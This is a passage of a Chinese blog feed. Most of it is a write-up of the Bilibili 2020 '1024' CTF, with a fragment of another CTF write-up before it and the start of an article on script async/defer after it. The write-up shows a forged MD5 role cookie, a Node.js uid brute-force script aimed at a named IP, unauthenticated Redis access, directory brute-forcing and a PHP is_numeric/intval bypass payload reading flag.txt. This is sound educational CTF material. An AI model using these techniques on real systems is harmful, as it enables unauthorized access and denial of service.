还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google 